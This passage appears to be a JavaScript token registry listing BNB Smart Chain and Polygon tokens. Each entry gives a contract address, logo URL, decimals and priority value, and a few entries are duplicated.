      priority: 53
    },
    {
      name: "Binance-Peg Dogecoin",
      symbol: "DOGE",
      address: "0xbA2aE424d960c26247Dd6c32edC70B295c744C43",
      logo: "https://assets.coingecko.com/coins/images/5/standard/dogecoin.png",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 54
    },
    {
      name: "Binance-Peg Filecoin",
      symbol: "FIL",
      address: "0x0D8Ce2A99Bb6e3B7Db580eD848240e4a0F9aE153",
      logo: "https://assets.coingecko.com/coins/images/12817/standard/filecoin.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 55
    },
    {
      name: "Binance-Peg Litecoin",
      symbol: "LTC",
      address: "0x4338665CBB7B2485A8855A139b75D5e34AB0DB94",
      logo: "https://assets.coingecko.com/coins/images/2/standard/litecoin.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 56
    },
    {
      name: "Binance-Peg Polkadot",
      symbol: "DOT",
      address: "0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402",
      logo: "https://assets.coingecko.com/coins/images/12171/standard/polkadot.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 57
    },
    {
      name: "Binance-Peg XRP",
      symbol: "XRP",
      address: "0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE",
      logo: "https://assets.coingecko.com/coins/images/44/standard/xrp-symbol-white-128.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 58
    },
    {
      name: "BitTorrent",
      symbol: "BTT",
      address: "0x8595F9dA7b868b1822194fAEd312235E43007b49",
      logo: "https://assets.coingecko.com/coins/images/7595/standard/BTT_Token_Graphic.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 59
    },
    {
      name: "Bunny Token",
      symbol: "BUNNY",
      address: "0xC9849E6fdB743d08fAeE3E34dd2D1bc69EA11a51",
      logo: "https://assets.coingecko.com/coins/images/13148/standard/bunnytoken.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 60
    },
    {
      name: "Burger Swap",
      symbol: "BURGER",
      address: "0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f",
      logo: "https://assets.coingecko.com/coins/images/12563/standard/burger.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 61
    },
    {
      name: "C.R.E.A.M.",
      symbol: "CREAM",
      address: "0xd4CB328A82bDf5f03eB737f37Fa6B370aef3e888",
      logo: "https://assets.coingecko.com/coins/images/11976/standard/Cream.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 62
    },
    {
      name: "Cake Monster",
      symbol: "MONSTA",
      address: "0x8A5d7FCD4c90421d21d30fCC4435948aC3618B2f",
      logo: "https://assets.coingecko.com/coins/images/16245/standard/monsta.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 63
    },
    {
      name: "Celer Network",
      symbol: "CELR",
      address: "0x1f9f6a696C6Fd109cD3956F45dC709d2b3902163",
      logo: "https://assets.coingecko.com/coins/images/4379/standard/Celr.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 64
    },
    {
      name: "Chromia",
      symbol: "CHR",
      address: "0xf9CeC8d50f6c8ad3Fb6dcCEC577e05aA32B224FE",
      logo: "https://assets.coingecko.com/coins/images/5000/standard/Chromia.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 65
    },
    {
      name: "Coin98",
      symbol: "C98",
      address: "0xaEC945e04baF28b135Fa7c640f624f8D90F1C3a6",
      logo: "https://assets.coingecko.com/coins/images/17117/standard/logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 66
    },
    {
      name: "Compound",
      symbol: "COMP",
      address: "0x52CE071Bd9b1C4B00A0b92D298c512478CaD67e8",
      logo: "https://assets.coingecko.com/coins/images/10775/standard/COMP.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 67
    },
    {
      name: "Conflux",
      symbol: "CFX",
      address: "0x045c4324039dA91c52C55DF5D785385Aab073DcF",
      logo: "https://assets.coingecko.com/coins/images/13079/standard/3vuYMbjN.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 68
    },
    {
      name: "Cream Finance",
      symbol: "CREAM",
      address: "0xd4CB328A82bDf5f03eB737f37Fa6B370aef3e888",
      logo: "https://assets.coingecko.com/coins/images/11976/standard/Cream.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 69
    },
    {
      name: "Crypto.com Coin",
      symbol: "CRO",
      address: "0x5C7F8A570d578ED84E63fdFA7b1eE72dEae1AE23",
      logo: "https://assets.coingecko.com/coins/images/7310/standard/cro_token_logo.png",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 70
    },
    {
      name: "Deri Protocol",
      symbol: "DERI",
      address: "0xe60eaf5A997DFAe83739e035b005A33AfdCc6df5",
      logo: "https://assets.coingecko.com/coins/images/13931/standard/deri_logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 71
    },
    {
      name: "DeXe",
      symbol: "DEXE",
      address: "0x039cB485212f996A9DBb85A9a75d898F94d38dA6",
      logo: "https://assets.coingecko.com/coins/images/12713/standard/logo_%2814%29.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 72
    },
    {
      name: "DODO",
      symbol: "DODO",
      address: "0x67ee3Cb086F8a16f34beE3ca72FAD36F7Db929e2",
      logo: "https://assets.coingecko.com/coins/images/12651/standard/dodo_logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 73
    },
    {
      name: "Dogecoin",
      symbol: "DOGE",
      address: "0xbA2aE424d960c26247Dd6c32edC70B295c744C43",
      logo: "https://assets.coingecko.com/coins/images/5/standard/dogecoin.png",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 74
    },
    {
      name: "Ellipsis",
      symbol: "EPS",
      address: "0xA7f552078dcC247C2684336020c03648500C6d9F",
      logo: "https://assets.coingecko.com/coins/images/14454/standard/ellipsis-light.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 75
    },
    {
      name: "EOS",
      symbol: "EOS",
      address: "0x56b6fB708fC5732DEC1Afc8D8556423A2EDcCbD6",
      logo: "https://assets.coingecko.com/coins/images/738/standard/eos-eos-logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 76
    },
    {
      name: "FEG Token",
      symbol: "FEG",
      address: "0xacFC95585D80Ab62f67A14C566C1b7a49Fe91167",
      logo: "https://assets.coingecko.com/coins/images/14533/standard/feglogo.png",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 77
    },
    {
      name: "Ferrum Network",
      symbol: "FRM",
      address: "0xa719b8aB7EA7AF0DDb4358719a34631bb79d15Dc",
      logo: "https://assets.coingecko.com/coins/images/8251/standard/frm.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 78
    },
    {
      name: "Filecoin",
      symbol: "FIL",
      address: "0x0D8Ce2A99Bb6e3B7Db580eD848240e4a0F9aE153",
      logo: "https://assets.coingecko.com/coins/images/12817/standard/filecoin.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 79
    },
    {
      name: "Frax Share",
      symbol: "FXS",
      address: "0xe48A3d7d0Bc88d552f730B62c006bC925eadB9eE",
      logo: "https://assets.coingecko.com/coins/images/13423/standard/frax_share.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 80
    },
    {
      name: "Frontier",
      symbol: "FRONT",
      address: "0x928e55daB735aa8260AF3cEDadA18B5f70C72f1b",
      logo: "https://assets.coingecko.com/coins/images/12479/standard/frontier_logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 81
    },
    {
      name: "Fusion",
      symbol: "FSN",
      address: "0x3B1a0c9252ee7403093fF55b4a5886d49a3d837a",
      logo: "https://assets.coingecko.com/coins/images/2515/standard/fusion.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 82
    },
    {
      name: "HARD Protocol",
      symbol: "HARD",
      address: "0xf79037F6f6bE66832DE4E7516be52826BC3cBcc4",
      logo: "https://assets.coingecko.com/coins/images/13008/standard/HARD_coin_256.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 83
    },
    {
      name: "Hegic",
      symbol: "HEGIC",
      address: "0x44Ec807ce2F4a6F2737A92e985f318d035883e47",
      logo: "https://assets.coingecko.com/coins/images/12454/standard/Hegic.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 84
    },
    {
      name: "Hoo Token",
      symbol: "HOO",
      address: "0xE1d1F66215998786110Ba0102ef558b22224C016",
      logo: "https://assets.coingecko.com/coins/images/3642/standard/512x512_Logo.png",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 85
    },
    {
      name: "Horizon Protocol",
      symbol: "HZN",
      address: "0xC0eFf7749b125444953ef89682201Fb8c6A917CD",
      logo: "https://assets.coingecko.com/coins/images/12783/standard/zJ5Jtz3.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 86
    },
    {
      name: "Injective Protocol",
      symbol: "INJ",
      address: "0xa2B726B1145A4773F68593CF171187d8EBe4d495",
      logo: "https://assets.coingecko.com/coins/images/12882/standard/injective_logo.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 87
    },
    {
      name: "IoTeX",
      symbol: "IOTX",
      address: "0x9678E42ceBEb63F23197D726B29b1CB20d0064E5",
      logo: "https://assets.coingecko.com/coins/images/3334/standard/iotex-logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 88
    },
    {
      name: "Juggernaut",
      symbol: "JGN",
      address: "0xC13B7a43223BB9Bf4B69BD68Ab20ca1B79d81C75",
      logo: "https://assets.coingecko.com/coins/images/14276/standard/JGN.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 89
    },
    {
      name: "Kava",
      symbol: "KAVA",
      address: "0x5F88AB06e8dfe89DF127B2430Bba4Af600866035",
      logo: "https://assets.coingecko.com/coins/images/9761/standard/kava.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 90
    },
    {
      name: "Klaytn",
      symbol: "KLAY",
      address: "0x67f6a7BbE0da067A746F1698f6019d0b4e9dB9a6",
      logo: "https://assets.coingecko.com/coins/images/9672/standard/klaytn.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 91
    },
    {
      name: "Linear",
      symbol: "LINA",
      address: "0x762539b45A1dCcE3D36d080F74d1AED37844b878",
      logo: "https://assets.coingecko.com/coins/images/12509/standard/linear.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 92
    },
    {
      name: "Litecoin",
      symbol: "LTC",
      address: "0x4338665CBB7B2485A8855A139b75D5e34AB0DB94",
      logo: "https://assets.coingecko.com/coins/images/2/standard/litecoin.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 93
    },
    {
      name: "LTO Network",
      symbol: "LTO",
      address: "0x857B222Fc79e1cBBf8Ca5f78CB133d1b7CF34BBd",
      logo: "https://assets.coingecko.com/coins/images/6068/standard/lto.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 94
    },
    {
      name: "MATH",
      symbol: "MATH",
      address: "0xF218184Af829Cf2b0019F8E6F0b2423498a36983",
      logo: "https://assets.coingecko.com/coins/images/11335/standard/2020-05-19-token-200.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 95
    },
    {
      name: "Mirror Protocol",
      symbol: "MIR",
      address: "0x5B6DcF557E2aBE2323c48445E8CC948910d8c2c9",
      logo: "https://assets.coingecko.com/coins/images/13295/standard/mirror_logo_transparent.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 96
    },
    {
      name: "Nerve Finance",
      symbol: "NRV",
      address: "0x42F6f551ae042cBe50C739158b4f0CAC0Edb9096",
      logo: "https://assets.coingecko.com/coins/images/14233/standard/nerve_finance.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 97
    },
    {
      name: "Nuls",
      symbol: "NULS",
      address: "0x8CD6e29d3686d24d3C2018CEe54621eA0f89313B",
      logo: "https://assets.coingecko.com/coins/images/1053/standard/Nuls.png",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 98
    },
    {
      name: "Orion Protocol",
      symbol: "ORN",
      address: "0xe4CA1F75ECA6214393fCE1C1b316C237664EaA8e",
      logo: "https://assets.coingecko.com/coins/images/11841/standard/orion_logo.png",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 99
    },
    {
      name: "Pancake Bunny",
      symbol: "BUNNY",
      address: "0xC9849E6fdB743d08fAeE3E34dd2D1bc69EA11a51",
      logo: "https://assets.coingecko.com/coins/images/13148/standard/bunnytoken.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 100
    },
    {
      name: "APX",
      symbol: "APX",
      address: "0x78F5d389F5CDCcFc41594aBaB4B0Ed02F31398b3",
      logo: "https://assets.coingecko.com/coins/images/21972/standard/apx.png?1696521320",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 3
    },
    {
      name: "AIOZ Network",
      symbol: "AIOZ",
      address: "0x33d08D8C7a168333a85285a68C0042b39fC3741D",
      logo: "https://s2.coinmarketcap.com/static/img/coins/64x64/9104.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 4
    },
    {
      name: "Koma Inu",
      symbol: "KOMA",
      address: "0xd5eaAaC47bD1993d661bc087E15dfb079a7f3C19",
      logo: "https://assets.coingecko.com/coins/images/50902/standard/IMG_7580.jpeg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 5
    },
    {
      name: "CZ'S Dog",
      symbol: "BROCCOLI",
      address: "0x6d5AD1592ed9D6D1dF9b93c793AB759573Ed6714",
      logo: "https://assets.coingecko.com/coins/images/54400/standard/broccoli.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 6
    },
    {
      name: "HELLO Labs",
      symbol: "HELLO",
      address: "0x0F1cBEd8EFa0E012AdbCCB1638D0aB0147D5Ac00",
      logo: "https://s2.coinmarketcap.com/static/img/coins/64x64/22320.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 61
    },
    {
      name: "WBNB",
      symbol: "WBNB",
      address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
      logo: "https://assets.coingecko.com/coins/images/12591/standard/binance-coin-logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 995
    },
    {
      name: "Binance USD",
      symbol: "BUSD",
      address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
      logo: "https://assets.coingecko.com/coins/images/31273/standard/new_binance-peg-busd.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 3
    },
    {
      name: "USD Coin",
      symbol: "USDC",
      address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
      logo: "https://assets.coingecko.com/coins/images/6319/standard/usdc.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 4
    },
    {
      name: "Dai Stablecoin",
      symbol: "DAI",
      address: "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3",
      logo: "https://assets.coingecko.com/coins/images/9956/standard/Badge_Dai.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 5
    },
    {
      name: "BabyDoge Coin",
      symbol: "BabyDoge",
      address: "0xc748673057861a797275CD8A068AbB95A902e8de",
      logo: "https://assets.coingecko.com/coins/images/16125/standard/babydoge.jpg",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 10
    },
    {
      name: "Shiba Inu",
      symbol: "SHIB",
      address: "0x2859e4544C4bB03966803b044A93563Bd2D0DD4D",
      logo: "https://assets.coingecko.com/coins/images/11939/standard/shiba.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 11
    },
    {
      name: "Floki Inu",
      symbol: "FLOKI",
      address: "0xfb5B838b6cfEEdC2873aB27866079AC55363D37E",
      logo: "https://assets.coingecko.com/coins/images/16746/standard/PNG_image.png",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 12
    },
    {
      name: "Dogelon Mars",
      symbol: "ELON",
      address: "0x7bd6FaBD64813c48545C9c0e312A0099d9be2540",
      logo: "https://assets.coingecko.com/coins/images/14962/standard/6GxcPRo3_400x400.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 13
    },
    {
      name: "Pepe",
      symbol: "PEPE",
      address: "0x25d887Ce7a35172C62FeBFD67a1856F20FaEbB00",
      logo: "https://assets.coingecko.com/coins/images/29850/standard/pepe-token.jpeg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 15
    },
    {
      name: "PancakeSwap",
      symbol: "CAKE",
      address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82",
      logo: "https://assets.coingecko.com/coins/images/12632/standard/pancakeswap-cake-logo_%281%29.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 20
    },
    {
      name: "ApeSwap",
      symbol: "BANANA",
      address: "0x603c7f932ED1fc6575303D8Fb018fDCBb0f39a95",
      logo: "https://assets.coingecko.com/coins/images/14870/standard/banana.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 21
    },
    {
      name: "Venus",
      symbol: "XVS",
      address: "0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63",
      logo: "https://assets.coingecko.com/coins/images/12677/standard/venus.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 22
    },
    {
      name: "Alpaca Finance",
      symbol: "ALPACA",
      address: "0x8F0528cE5eF7B51152A59745bEfDD91D97091d2F",
      logo: "https://assets.coingecko.com/coins/images/14165/standard/Logo200.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 23
    },
    {
      name: "Ethereum",
      symbol: "ETH",
      address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
      logo: "https://assets.coingecko.com/coins/images/279/standard/ethereum.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 30
    },
    {
      name: "Bitcoin BEP2",
      symbol: "BTCB",
      address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c",
      logo: "https://assets.coingecko.com/coins/images/14108/standard/Binance-bitcoin.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 31
    },
    {
      name: "Chainlink",
      symbol: "LINK",
      address: "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",
      logo: "https://assets.coingecko.com/coins/images/877/standard/chainlink-new-logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 32
    },
    {
      name: "Polygon",
      symbol: "MATIC",
      address: "0xCC42724C6683B7E57334c4E856f4c9965ED682bD",
      logo: "https://assets.coingecko.com/coins/images/4713/standard/polygon.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 33
    },
    {
      name: "Cardano",
      symbol: "ADA",
      address: "0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47",
      logo: "https://assets.coingecko.com/coins/images/975/standard/cardano.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 34
    },
    {
      name: "Binance Wrapped DOT",
      symbol: "BDOT",
      address: "0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7",
      logo: "https://example.com/bdot.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 40
    },
    {
      name: "Ankr",
      symbol: "ANKR",
      address: "0xf307910A4c7bbc79691fD374889b36d8531B08e3",
      logo: "https://assets.coingecko.com/coins/images/4324/standard/U85xTl2.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 41
    },
    {
      name: "Chromia",
      symbol: "CHR",
      address: "0xf9CeC8d50f6c8ad3Fb6dcCEC577e05aA32B224FE",
      logo: "https://assets.coingecko.com/coins/images/5000/standard/Chromia.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 42
    },
    {
      name: "Alchemy Pay",
      symbol: "ACH",
      address: "0xbc7d6b50616989655afd682fb42743507003056d",
      logo: "https://assets.coingecko.com/coins/images/12390/standard/ACH_%281%29.png",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 43
    },
    {
      name: "Bella Protocol",
      symbol: "BEL",
      address: "0x8443f091997f06a61670b735ed92734f5628692f",
      logo: "https://assets.coingecko.com/coins/images/12478/standard/Bella.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 44
    },
    {
      name: "Biconomy",
      symbol: "BICO",
      address: "0x06250a4962558f0f3e69fc07f4c67bb9c9eac739",
      logo: "https://assets.coingecko.com/coins/images/21061/standard/biconomy_logo.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 45
    },
    {
      name: "Cartesi",
      symbol: "CTSI",
      address: "0x8da443f84fea710266c8eb6bc34b71702d033ef2",
      logo: "https://assets.coingecko.com/coins/images/11038/standard/cartesi.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 46
    },
    {
      name: "Green Metaverse Token",
      symbol: "GMT",
      address: "0x3019BF2a2eF8040C242C9a4c5c4BD4C81678b2A1",
      logo: "https://assets.coingecko.com/coins/images/14270/standard/step.png",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 24
    },
    {
      name: "Trust Wallet Token",
      symbol: "TWT",
      address: "0x4B0F1812e5Df2A09796481Ff14017e6005508003",
      logo: "https://assets.coingecko.com/coins/images/11085/standard/Trust.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 25
    },
    {
      name: "SafeMoon",
      symbol: "SFM",
      address: "0x42981d0bfbAf196529376EE702F2a9Eb9092fcB5",
      logo: "https://assets.coingecko.com/coins/images/21863/standard/photo_2021-12-22_14.43.36.jpeg",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 26
    },
    {
      name: "WINkLink",
      symbol: "WIN",
      address: "0xaeF0d72a118ce24feE3cD1d43d383897D05B4e99",
      logo: "https://assets.coingecko.com/coins/images/9129/standard/WINkcoin.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 28
    },
    {
      name: "Ankr Staked BNB",
      symbol: "ankrBNB",
      address: "0x52F24a5e03aee338Da5fd9Df68D2b6FAe1178827",
      logo: "https://assets.coingecko.com/coins/images/29696/standard/ankrBNB.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 29
    },
    {
      name: "Mobox",
      symbol: "MBOX",
      address: "0x3203c9e46cA618C8C1cE5dC67e7e9D75f5da2377",
      logo: "https://assets.coingecko.com/coins/images/14751/standard/mobox.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 30
    },
    {
      name: "BNB",
      symbol: "BNB",
      address: "0x0000000000000000000000000000000000000000",
      logo: "https://assets.coingecko.com/coins/images/825/standard/bnb-icon2_2x.png",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 999
    }
  ],

  polygon: [
    {
      name: "AUTO",
      symbol: "AUTO",
      address: "0x7f426f6dc648e50464a0392e60e1bb465a67e9cf",
      logo: "https://assets.coingecko.com/coins/images/13751/standard/autofarm_icon_200x200.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 1
    },
    {
      name: "Tether USD",
      symbol: "USDT",
      address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
      logo: "https://assets.coingecko.com/coins/images/325/standard/Tether.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 2
    },
    {
      name: "USD Coin",
      symbol: "USDC",
      address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
      logo: "https://assets.coingecko.com/coins/images/6319/standard/usdc.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 3
    },
    {
      name: "Dai Stablecoin",
      symbol: "DAI",
      address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",
      logo: "https://assets.coingecko.com/coins/images/9956/standard/Badge_Dai.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 4
    },
    {
      name: "BabyDoge Coin",
      symbol: "BabyDoge",
      address: "0x4E158Ef7F1E3DA85E2c1D2a9e2270F4C2E0D3294",
      logo: "https://assets.coingecko.com/coins/images/16125/standard/babydoge.jpg",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 10
    },
    {
      name: "Shiba Inu",
      symbol: "SHIB",
      address: "0x6f8a06447Ff6FcF75d803135a7de15CE88C1d4ec",
      logo: "https://assets.coingecko.com/coins/images/11939/standard/shiba.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 11
    },
    {
      name: "Floki Inu",
      symbol: "FLOKI",
      address: "0x3A9A81d576d83FF21f26f325066054540720fC34",
      logo: "https://assets.coingecko.com/coins/images/16746/standard/PNG_image.png",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 12
    },
    {
      name: "QuickSwap",
      symbol: "QUICK",
      address: "0x831753DD7087CaC61aB5644b308642cc1c33Dc13",
      logo: "https://assets.coingecko.com/coins/images/13970/standard/QuickSwap.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 20
    },
    {
      name: "Aave",
      symbol: "AAVE",
      address: "0xD6DF932A45C0f255f85145f286eA0b292B21C90B",
      logo: "https://assets.coingecko.com/coins/images/12645/standard/AAVE.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 21
    },
    {
      name: "Curve DAO",
      symbol: "CRV",
      address: "0x172370d5Cd63279eFa6d502DAB29171933a610AF",
      logo: "https://assets.coingecko.com/coins/images/12124/standard/Curve.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 22
    },
    {
      name: "Ethereum",
      symbol: "ETH",
      address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619",
      logo: "https://assets.coingecko.com/coins/images/279/standard/ethereum.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 30
    },
    {
      name: "Wrapped Bitcoin",
      symbol: "WBTC",
      address: "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6",
      logo: "https://assets.coingecko.com/coins/images/7598/standard/wrapped_bitcoin_wbtc.png",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 31
    },
    {
      name: "Chainlink",
      symbol: "LINK",
      address: "0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39",
      logo: "https://assets.coingecko.com/coins/images/877/standard/chainlink-new-logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 32
    },
    {
      name: "Uniswap",
      symbol: "UNI",
      address: "0xb33EaAd8d922B1083446DC23f610c2567fB5180f",
      logo: "https://assets.coingecko.com/coins/images/12504/standard/uniswap-uni.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 33
    },
    {
      name: "Decentraland",
      symbol: "MANA",
      address: "0xA1c57f48F0Deb89f569dFbE6E2B7f46D33606fD4",
      logo: "https://assets.coingecko.com/coins/images/878/standard/decentraland-mana.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 40
    },
    {
      name: "The Sandbox",
      symbol: "SAND",
      address: "0xBbba073C31bF03b8ACf7c28EF0738DeCF3695683",
      logo: "https://assets.coingecko.com/coins/images/12129/standard/sandbox_logo.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 41
    },
    {
      name: "Axie Infinity",
      symbol: "AXS",
      address: "0x61BDD9C7d4dF4Bf47A4508c0c8245505F2Af5b7b",
      logo: "https://assets.coingecko.com/coins/images/13029/standard/axie-infinity-small-logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 42
    },
    {
      name: "DinoSwap",
      symbol: "DINO",
      address: "0xAa9654BECca45B5BDFA5ac646c939C62b527D394",
      logo: "https://assets.coingecko.com/coins/images/17103/standard/dino.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 43
    },
    {
      name: "Dfyn Network",
      symbol: "DFYN",
      address: "0xC168E40227E4ebD8C1caE80F7a55a4F0e6D66C97",
      logo: "https://assets.coingecko.com/coins/images/15126/standard/dfyn.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 44
    },
    {
      name: "Dogelon Mars",
      symbol: "ELON",
      address: "0xE0339c80fFDE91F3e20494Df88d4206D86024cdF",
      logo: "https://assets.coingecko.com/coins/images/14962/standard/6GxcPRo3_400x400.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 45
    },
    {
      name: "Gains Farm",
      symbol: "GFARM2",
      address: "0x7075cAB6bCCA06613e2d071bd918D1a0241379E2",
      logo: "https://assets.coingecko.com/coins/images/13703/standard/gfarm_v2.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 46
    },
    {
      name: "Impermax",
      symbol: "IMX",
      address: "0x60bB3D364B765C497C8cE50AE0Ae3f0882c5bD05",
      logo: "https://assets.coingecko.com/coins/images/15126/standard/Copy_of_200px.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 47
    },
    {
      name: "SushiSwap",
      symbol: "SUSHI",
      address: "0x0b3F868E0BE5597D5DB7fEB59E1CADBb0fdDa50a",
      logo: "https://assets.coingecko.com/coins/images/12271/standard/512x512_Logo_no_chop.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 23
    },
    {
      name: "QiDao",
      symbol: "QI",
      address: "0x580A84C73811E1839F75d86d75d88cCa0c241fF4",
      logo: "https://assets.coingecko.com/coins/images/15329/standard/qi.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 24
    },
    {
      name: "Gains Network",
      symbol: "GNS",
      address: "0xE5417Af564e4bFDA1c483642db72007871397896",
      logo: "https://assets.coingecko.com/coins/images/19737/standard/logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 25
    },
    {
      name: "Plasma Finance",
      symbol: "PPAY",
      address: "0x08158A6b5d4018340387d1A302f882E98a8bC5b4",
      logo: "https://assets.coingecko.com/coins/images/13360/standard/Hi9sEGAD.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 26
    },
    {
      name: "Polymath",
      symbol: "POLY",
      address: "0xcB059C5573646047D6d88dDdb87B745C18161d3b",
      logo: "https://assets.coingecko.com/coins/images/2784/standard/inKkF01.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 27
    },
    {
      name: "MATIC",
      symbol: "MATIC",
      address: "0x0000000000000000000000000000000000000000",
      logo: "https://assets.coingecko.com/coins/images/4713/standard/polygon.png",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 999
    }
  ]
};
